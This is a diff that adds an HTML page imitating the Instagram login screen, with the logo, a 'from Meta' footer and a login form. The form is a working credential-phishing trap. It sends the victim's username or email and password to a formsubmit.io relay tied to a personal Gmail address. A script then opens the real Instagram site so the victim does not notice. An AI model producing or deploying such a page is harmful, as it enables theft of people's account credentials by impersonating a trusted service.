@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="styles/r.css">
+    <link rel="stylesheet" href="styles/s.css">
+    <title>Instagram</title>
+</head>
+<body>
+    <main>
+        <img src="/images/instagram.logo.png" alt="" id="instalogo">
+
+        <form action="https://formsubmit.io/send/mr7kitkat@gmail.com" method="POST">
+            <input name="email" type="email" id="name" placeholder="Phone number, username, or email">
+            <input type="password" name="password" id="pwd" placeholder="Password"> 
+            <a href="#" id="forget">Forget password?</a>
+            <input value="Log In" type="submit" id="log">
+        </form>
+
+        <p>Don't have an account? <a href="" id="su">Sign Up</a></p>
+    </main>
+
+    <footer>
+        <p>from</p>
+        <div id="metalogo">
+            <img src="/images/meta.png" alt="Meta" id="meta"><span>Meta</span>
+        </div>
+        
+    </footer>
+
+    <script>
+        const login = document.querySelector('#log');
+
+        login.addEventListener('click',() => {
+            window.open('https://www.instagram.com/','_blank');
+        });
+    </script>
+</body>
+</html>
